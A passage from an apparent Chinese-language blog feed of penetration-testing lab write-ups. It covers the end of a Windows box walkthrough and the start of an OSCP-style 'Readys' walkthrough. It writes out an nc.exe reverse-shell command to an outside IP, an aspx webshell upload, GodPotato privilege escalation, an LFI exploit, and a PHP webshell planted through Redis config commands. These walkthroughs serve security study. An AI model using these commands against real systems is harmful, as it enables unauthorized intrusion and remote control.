&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1010&#34; height=&#34;138&#34; src=&#34;../legacy/uploads/2025/05/1748611214-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1553&#34; srcset=&#34;../legacy/uploads/2025/05/1748611214-image.png 1010w, ../legacy/uploads/2025/05/1748611214-image-300x41.png 300w, ../legacy/uploads/2025/05/1748611214-image-768x105.png 768w&#34; sizes=&#34;auto, (max-width: 1010px) 100vw, 1010px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;获得c.bum的shell:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;782&#34; height=&#34;265&#34; src=&#34;../legacy/uploads/2025/05/1748611237-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1554&#34; srcset=&#34;../legacy/uploads/2025/05/1748611237-image.png 782w, ../legacy/uploads/2025/05/1748611237-image-300x102.png 300w, ../legacy/uploads/2025/05/1748611237-image-768x260.png 768w&#34; sizes=&#34;auto, (max-width: 782px) 100vw, 782px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在c.bum的desktop下可以找到&lt;strong&gt;User flag&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;用netstat -ano查看开放端口发现了一个在内网开放的8000端口:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;907&#34; height=&#34;581&#34; src=&#34;../legacy/uploads/2025/05/1748611298-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1556&#34; srcset=&#34;../legacy/uploads/2025/05/1748611298-image.png 907w, ../legacy/uploads/2025/05/1748611298-image-300x192.png 300w, ../legacy/uploads/2025/05/1748611298-image-768x492.png 768w&#34; sizes=&#34;auto, (max-width: 907px) 100vw, 907px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;同时在C盘下发现了inetpub文件夹，这个文件夹一般是IIS服务的根目录. 在下面发现了一个development的文件夹，猜测可能是内网8000端口开放的IIS http服务器。c.bum对这个文件有写权限:&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;728&#34; height=&#34;897&#34; src=&#34;../legacy/uploads/2025/05/1748611481-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1558&#34; srcset=&#34;../legacy/uploads/2025/05/1748611481-image.png 728w, ../legacy/uploads/2025/05/1748611481-image-243x300.png 243w&#34; sizes=&#34;auto, (max-width: 728px) 100vw, 728px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;一般情况下，IIS服务使用的是一个虚拟账号&lt;strong&gt;IIS AppPool\DefaultAppPool&lt;/strong&gt; 而作为一个服务账号，一般默认会开启Impersonate权限。我们可以利用ligolo-ng来把内网端口forward到我们本地。先上传一个aspx的webshell：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;929&#34; height=&#34;552&#34; src=&#34;../legacy/uploads/2025/05/1748611690-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1563&#34; srcset=&#34;../legacy/uploads/2025/05/1748611690-image.png 929w, ../legacy/uploads/2025/05/1748611690-image-300x178.png 300w, ../legacy/uploads/2025/05/1748611690-image-768x456.png 768w&#34; sizes=&#34;auto, (max-width: 929px) 100vw, 929px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;上传agent.exe&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;926&#34; height=&#34;129&#34; src=&#34;../legacy/uploads/2025/05/1748611743-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1564&#34; srcset=&#34;../legacy/uploads/2025/05/1748611743-image.png 926w, ../legacy/uploads/2025/05/1748611743-image-300x42.png 300w, ../legacy/uploads/2025/05/1748611743-image-768x107.png 768w&#34; sizes=&#34;auto, (max-width: 926px) 100vw, 926px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;本地开启ligolo服务器，并用agent连接：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;520&#34; src=&#34;../legacy/uploads/2025/05/1748611863-image-1024x520.png&#34; alt=&#34;&#34; class=&#34;wp-image-1568&#34; srcset=&#34;../legacy/uploads/2025/05/1748611863-image-1024x520.png 1024w, ../legacy/uploads/2025/05/1748611863-image-300x152.png 300w, ../legacy/uploads/2025/05/1748611863-image-768x390.png 768w, ../legacy/uploads/2025/05/1748611863-image.png 1377w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;ligolo有一个&amp;quot;magic ip&amp;quot; 240.0.0.1, 当把路由地址设置为这个地址时，可以用kali连接240.0.0.1来访问靶机的本地端口. 设置完毕后，浏览器访问240.0.0.1:8000 :&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;561&#34; src=&#34;../legacy/uploads/2025/05/1748612116-image-1024x561.png&#34; alt=&#34;&#34; class=&#34;wp-image-1571&#34; srcset=&#34;../legacy/uploads/2025/05/1748612116-image-1024x561.png 1024w, ../legacy/uploads/2025/05/1748612116-image-300x164.png 300w, ../legacy/uploads/2025/05/1748612116-image-768x421.png 768w, ../legacy/uploads/2025/05/1748612116-image-1536x841.png 1536w, ../legacy/uploads/2025/05/1748612116-image.png 1649w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;访问cmd.aspx：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;927&#34; height=&#34;245&#34; src=&#34;../legacy/uploads/2025/05/1748612296-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1572&#34; srcset=&#34;../legacy/uploads/2025/05/1748612296-image.png 927w, ../legacy/uploads/2025/05/1748612296-image-300x79.png 300w, ../legacy/uploads/2025/05/1748612296-image-768x203.png 768w&#34; sizes=&#34;auto, (max-width: 927px) 100vw, 927px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;确实是&lt;strong&gt;IIS AppPool\DefaultAppPool&lt;/strong&gt;这个账号：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;862&#34; src=&#34;../legacy/uploads/2025/05/1748612336-image-1024x862.png&#34; alt=&#34;&#34; class=&#34;wp-image-1574&#34; srcset=&#34;../legacy/uploads/2025/05/1748612336-image-1024x862.png 1024w, ../legacy/uploads/2025/05/1748612336-image-300x253.png 300w, ../legacy/uploads/2025/05/1748612336-image-768x647.png 768w, ../legacy/uploads/2025/05/1748612336-image.png 1088w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也可以看到确实开启了Impersonate权限。接下来利用之前上传的nc.exe来获取这个用户的shell：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: plain; title: ; notranslate&#34; title=&#34;&#34;&gt;
C:\xampp\htdocs\flight.htb\nc.exe 10.10.16.8 7777 -e cmd.exe
&lt;/pre&gt;
&lt;/div&gt;&lt;figure class=&#34;wp-block-image size-large&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;269&#34; src=&#34;../legacy/uploads/2025/05/1748612441-image-1024x269.png&#34; alt=&#34;&#34; class=&#34;wp-image-1576&#34; srcset=&#34;../legacy/uploads/2025/05/1748612441-image-1024x269.png 1024w, ../legacy/uploads/2025/05/1748612441-image-300x79.png 300w, ../legacy/uploads/2025/05/1748612441-image-768x202.png 768w, ../legacy/uploads/2025/05/1748612441-image-1536x403.png 1536w, ../legacy/uploads/2025/05/1748612441-image.png 1574w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation
&lt;/h2&gt;&lt;p&gt;因为不确定defaultapppool可以在哪些文件下读写，于是直接把xxxxPotato下载到Public/Documents下：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;645&#34; height=&#34;363&#34; src=&#34;../legacy/uploads/2025/05/1748612631-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1579&#34; srcset=&#34;../legacy/uploads/2025/05/1748612631-image.png 645w, ../legacy/uploads/2025/05/1748612631-image-300x169.png 300w&#34; sizes=&#34;auto, (max-width: 645px) 100vw, 645px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试了JuicyPotato, PrintSpoofer, GodPotato. 最后GodPotato成功。&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1005&#34; height=&#34;649&#34; src=&#34;../legacy/uploads/2025/05/1748612728-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1581&#34; srcset=&#34;../legacy/uploads/2025/05/1748612728-image.png 1005w, ../legacy/uploads/2025/05/1748612728-image-300x194.png 300w, ../legacy/uploads/2025/05/1748612728-image-768x496.png 768w&#34; sizes=&#34;auto, (max-width: 1005px) 100vw, 1005px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在Administrator下找到root flag:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;631&#34; src=&#34;../legacy/uploads/2025/05/1748612769-image-1024x631.png&#34; alt=&#34;&#34; class=&#34;wp-image-1582&#34; srcset=&#34;../legacy/uploads/2025/05/1748612769-image-1024x631.png 1024w, ../legacy/uploads/2025/05/1748612769-image-300x185.png 300w, ../legacy/uploads/2025/05/1748612769-image-768x473.png 768w, ../legacy/uploads/2025/05/1748612769-image.png 1061w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Happy Hacking&lt;/p&gt;
</description>
        </item>
        <item>
        <title>OSCP-PGP Readys Writeup</title>
        <link>http://localhost:1313/oscp-pgp-readys-writeup/</link>
        <pubDate>Wed, 28 May 2025 08:43:08 +0000</pubDate>
        
        <guid>http://localhost:1313/oscp-pgp-readys-writeup/</guid>
        <description>&lt;img src="http://localhost:1313/legacy/uploads/2025/03/1743336789-gura-150x150.jpg" alt="Featured image of post OSCP-PGP Readys Writeup" /&gt;&lt;ul class=&#34;wp-block-list&#34;&gt;
  &lt;li&gt;
    Difficulty: Linux
  &lt;/li&gt;
  &lt;li&gt;
    Community Rate: Very Hard
  &lt;/li&gt;
  &lt;li&gt;
    OS: Windows
  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;nmap-result&#34;&gt;Nmap result
&lt;/h2&gt;&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 74:ba:20:23:89:92:62:02:9f:e7:3d:3b:83:d4:d9:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGGcX/x/M6J7Y0V8EeUt0FqceuxieEOe2fUH2RsY3XiSxByQWNQi+XSrFElrfjdR2sgnauIWWhWibfD+kTmSP5gkFcaoSsLtgfMP/2G8yuxPSev+9o1N18gZchJneakItNTaz1ltG1W//qJPZDHmkDneyv798f9ZdXBzidtR5/+2ArZd64bldUxx0irH0lNcf+ICuVlhOZyXGvSx/ceMCRozZrW2JQU+WLvs49gC78zZgvN+wrAZ/3s8gKPOIPobN3ObVSkZ+zngt0Xg/Zl11LLAbyWX7TupAt6lTYOvCSwNVZURyB1dDdjlMAXqT/Ncr4LbP+tvsiI1BKlqxx4I2r
|   256 54:8f:79:55:5a:b0:3a:69:5a:d5:72:39:64:fd:07:4e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpAb2jUKovAahxmPX9l95Pq9YWgXfIgDJw0obIpOjOkdP3b0ukm/mrTNgX2lg1mQBMlS3lzmQmxeyHGg9+xuJA=
|   256 7f:5d:10:27:62:ba:75:e9:bc:c8:4f:e2:72:87:d4:e2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0omUJRIaMtPNYa4CKBC+XUzVyZsJ1QwsksjpA/6Ml+
80/tcp   open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 5.7.2
|_http-title: Readys &amp;#8211; Just another WordPress site
6379/tcp open  redis   syn-ack ttl 61 Redis key-value store
&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id=&#34;initial-foothold&#34;&gt;Initial Foothold
&lt;/h2&gt;&lt;p&gt;80 HTTP 类似于一个个人博客，大标题上有说用了wordpress&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;542&#34; src=&#34;../legacy/uploads/2025/05/1748417544-image-1024x542.png&#34; alt=&#34;&#34; class=&#34;wp-image-1424&#34; srcset=&#34;../legacy/uploads/2025/05/1748417544-image-1024x542.png 1024w, ../legacy/uploads/2025/05/1748417544-image-300x159.png 300w, ../legacy/uploads/2025/05/1748417544-image-768x406.png 768w, ../legacy/uploads/2025/05/1748417544-image.png 1522w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;直接用wpsscan扫描一下：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
wpscan --url http://192.168.201.166/ -e vp --plugins-detection mixed --api-token token
&lt;/pre&gt;
&lt;/div&gt;&lt;figure class=&#34;wp-block-image size-full&#34;&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;945&#34; height=&#34;535&#34; src=&#34;../legacy/uploads/2025/05/1748418293-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1428&#34; srcset=&#34;../legacy/uploads/2025/05/1748418293-image.png 945w, ../legacy/uploads/2025/05/1748418293-image-300x170.png 300w, ../legacy/uploads/2025/05/1748418293-image-768x435.png 768w&#34; sizes=&#34;auto, (max-width: 945px) 100vw, 945px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;扫描出来Site Editor这个插件有LFI漏洞，搜索一下CVE-2018-7422，在&lt;a href=&#34;https://www.exploit-db.com/exploits/44340&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;ExploitDatabase&lt;/a&gt;找到相应POC。&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;62&#34; src=&#34;../legacy/uploads/2025/05/1748418395-image-1024x62.png&#34; alt=&#34;&#34; class=&#34;wp-image-1430&#34; srcset=&#34;../legacy/uploads/2025/05/1748418395-image-1024x62.png 1024w, ../legacy/uploads/2025/05/1748418395-image-300x18.png 300w, ../legacy/uploads/2025/05/1748418395-image-768x46.png 768w, ../legacy/uploads/2025/05/1748418395-image-1536x93.png 1536w, ../legacy/uploads/2025/05/1748418395-image.png 1654w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试访问这个URI：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;183&#34; src=&#34;../legacy/uploads/2025/05/1748418432-image-1024x183.png&#34; alt=&#34;&#34; class=&#34;wp-image-1431&#34; srcset=&#34;../legacy/uploads/2025/05/1748418432-image-1024x183.png 1024w, ../legacy/uploads/2025/05/1748418432-image-300x54.png 300w, ../legacy/uploads/2025/05/1748418432-image-768x137.png 768w, ../legacy/uploads/2025/05/1748418432-image-1536x275.png 1536w, ../legacy/uploads/2025/05/1748418432-image.png 1923w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;漏洞存在。获得用户名alice，因为22 ssh端口开放，尝试下能否获得用户的id_rsa. &lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;147&#34; src=&#34;../legacy/uploads/2025/05/1748418489-image-1024x147.png&#34; alt=&#34;&#34; class=&#34;wp-image-1432&#34; srcset=&#34;../legacy/uploads/2025/05/1748418489-image-1024x147.png 1024w, ../legacy/uploads/2025/05/1748418489-image-300x43.png 300w, ../legacy/uploads/2025/05/1748418489-image-768x110.png 768w, ../legacy/uploads/2025/05/1748418489-image.png 1289w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可惜找不到文件. 再尝试下.bash_history是否存在:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;153&#34; src=&#34;../legacy/uploads/2025/05/1748418539-image-1024x153.png&#34; alt=&#34;&#34; class=&#34;wp-image-1433&#34; srcset=&#34;../legacy/uploads/2025/05/1748418539-image-1024x153.png 1024w, ../legacy/uploads/2025/05/1748418539-image-300x45.png 300w, ../legacy/uploads/2025/05/1748418539-image-768x114.png 768w, ../legacy/uploads/2025/05/1748418539-image.png 1248w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;也没有，但可以直接获得local.txt&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;781&#34; height=&#34;200&#34; src=&#34;../legacy/uploads/2025/05/1748418565-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1434&#34; srcset=&#34;../legacy/uploads/2025/05/1748418565-image.png 781w, ../legacy/uploads/2025/05/1748418565-image-300x77.png 300w, ../legacy/uploads/2025/05/1748418565-image-768x197.png 768w&#34; sizes=&#34;auto, (max-width: 781px) 100vw, 781px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试找一下webroot：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;287&#34; src=&#34;../legacy/uploads/2025/05/1748418799-image-1024x287.png&#34; alt=&#34;&#34; class=&#34;wp-image-1436&#34; srcset=&#34;../legacy/uploads/2025/05/1748418799-image-1024x287.png 1024w, ../legacy/uploads/2025/05/1748418799-image-300x84.png 300w, ../legacy/uploads/2025/05/1748418799-image-768x215.png 768w, ../legacy/uploads/2025/05/1748418799-image.png 1290w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;应该就是在/var/www/html/ 这下面 如文件不存在则会返回Not Found.&lt;/p&gt;
&lt;p&gt;暂且搁置80, 看看其他的端口。6379端口显示是redis服务器：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;537&#34; height=&#34;31&#34; src=&#34;../legacy/uploads/2025/05/1748418878-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1439&#34; srcset=&#34;../legacy/uploads/2025/05/1748418878-image.png 537w, ../legacy/uploads/2025/05/1748418878-image-300x17.png 300w&#34; sizes=&#34;auto, (max-width: 537px) 100vw, 537px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;google一下是什么：&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Redis（Remote Dictionary Server）是一个开源的内存数据结构存储系统，主要用于缓存、消息队列和高性能键值数据库场景。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;在&lt;a href=&#34;https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#redis-rce&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;Hacktricks&lt;/a&gt;里能找到渗透redis的方法. 先安装对应的工具, 并尝试连接:&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
sudo apt-get install redis-tools
redis-cli -h 192.168.201.166
192.168.201.166:6379&amp;gt;info
NOAUTH Authentication required.
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;服务器开启了验证, 需要先拿到credential. Hacktricks里也提到了redis.conf文件里可能会包含验证所需的密码。在网上找了一圈redis.conf location后在/etc/redis/redis.conf找到这个文件:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;366&#34; src=&#34;../legacy/uploads/2025/05/1748419718-image-1024x366.png&#34; alt=&#34;&#34; class=&#34;wp-image-1444&#34; srcset=&#34;../legacy/uploads/2025/05/1748419718-image-1024x366.png 1024w, ../legacy/uploads/2025/05/1748419718-image-300x107.png 300w, ../legacy/uploads/2025/05/1748419718-image-768x274.png 768w, ../legacy/uploads/2025/05/1748419718-image.png 1518w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt; &lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;325&#34; height=&#34;99&#34; src=&#34;../legacy/uploads/2025/05/1748419724-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1445&#34; srcset=&#34;../legacy/uploads/2025/05/1748419724-image.png 325w, ../legacy/uploads/2025/05/1748419724-image-300x91.png 300w&#34; sizes=&#34;auto, (max-width: 325px) 100vw, 325px&#34; /&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;在文中找到密码 Ready4Redis? 尝试验证：&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;744&#34; height=&#34;301&#34; src=&#34;../legacy/uploads/2025/05/1748419773-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1446&#34; srcset=&#34;../legacy/uploads/2025/05/1748419773-image.png 744w, ../legacy/uploads/2025/05/1748419773-image-300x121.png 300w&#34; sizes=&#34;auto, (max-width: 744px) 100vw, 744px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;验证成功.&lt;/p&gt;
&lt;p&gt;Hacktricks中也提到，可以利用redis-cli在服务器上创建文件 可以尝试上传一个webshell&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;434&#34; src=&#34;../legacy/uploads/2025/05/1748419885-image-1024x434.png&#34; alt=&#34;&#34; class=&#34;wp-image-1447&#34; srcset=&#34;../legacy/uploads/2025/05/1748419885-image-1024x434.png 1024w, ../legacy/uploads/2025/05/1748419885-image-300x127.png 300w, ../legacy/uploads/2025/05/1748419885-image-768x325.png 768w, ../legacy/uploads/2025/05/1748419885-image.png 1220w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试了很多位置，都以error结束。&lt;figure class=&#34;wp-block-image size-full&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;743&#34; height=&#34;301&#34; src=&#34;../legacy/uploads/2025/05/1748420056-image.png&#34; alt=&#34;&#34; class=&#34;wp-image-1448&#34; srcset=&#34;../legacy/uploads/2025/05/1748420056-image.png 743w, ../legacy/uploads/2025/05/1748420056-image-300x122.png 300w&#34; sizes=&#34;auto, (max-width: 743px) 100vw, 743px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后又尝试了hacktricks里提到的: &lt;a href=&#34;https://github.com/n0b0dyCN/redis-rogue-server&#34; target=&#34;_blank&#34;  rel=&#34;nofollow&#34; &gt;radis-rogue-server&lt;/a&gt; 但这个项目是好多年前的了，用了几个类似的exploit全都不管用. 卡在这里了很久, 看了别人的writeup都可以运行, 我这边无论如何都不能跑. 无奈去看了官方的Writeup, 受益匪浅.&lt;/p&gt;
&lt;p&gt;官方Writeup则是先利用LFI查看/etc/systemd/system/redis.service中的信息. 这个文件中包含了服务的各种配置，例如哪里可读，哪里可写：&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;161&#34; src=&#34;../legacy/uploads/2025/05/1748420484-image-1024x161.png&#34; alt=&#34;&#34; class=&#34;wp-image-1452&#34; srcset=&#34;../legacy/uploads/2025/05/1748420484-image-1024x161.png 1024w, ../legacy/uploads/2025/05/1748420484-image-300x47.png 300w, ../legacy/uploads/2025/05/1748420484-image-768x120.png 768w, ../legacy/uploads/2025/05/1748420484-image-1536x241.png 1536w, ../legacy/uploads/2025/05/1748420484-image.png 1913w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;尝试在/opt/redis-files下写入文件：&lt;/p&gt;
&lt;div class=&#34;wp-block-syntaxhighlighter-code &#34;&gt;
  &lt;pre class=&#34;brush: bash; title: ; notranslate&#34; title=&#34;&#34;&gt;
192.168.201.166:6379&amp;gt; config set dir /opt/redis-files
OK
192.168.201.166:6379&amp;gt; config set dbfilename redis.php
OK
192.168.201.166:6379&amp;gt; set test &#34;&amp;lt;?php system($_GET&amp;#x5B;&amp;#039;cmd&amp;#039;]); ?&amp;gt;&#34;
OK
192.168.201.166:6379&amp;gt; save
OK
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;终于成功，接下来就可以利用LFI来访问刚刚创建的php文件.&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; decoding=&#34;async&#34; width=&#34;1024&#34; height=&#34;112&#34; src=&#34;../legacy/uploads/2025/05/1748420641-image-1024x112.png&#34; alt=&#34;&#34; class=&#34;wp-image-1455&#34; srcset=&#34;../legacy/uploads/2025/05/1748420641-image-1024x112.png 1024w, ../legacy/uploads/2025/05/1748420641-image-300x33.png 300w, ../legacy/uploads/2025/05/1748420641-image-768x84.png 768w, ../legacy/uploads/2025/05/1748420641-image-1536x169.png 1536w, ../legacy/uploads/2025/05/1748420641-image.png 1896w&#34; sizes=&#34;auto, (max-width: 1024px) 100vw, 1024px&#34; /&gt; &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;成功执行命令. 尝试获得reverse shell:&lt;figure class=&#34;wp-block-image size-large&#34;&gt;&lt;/p&gt;
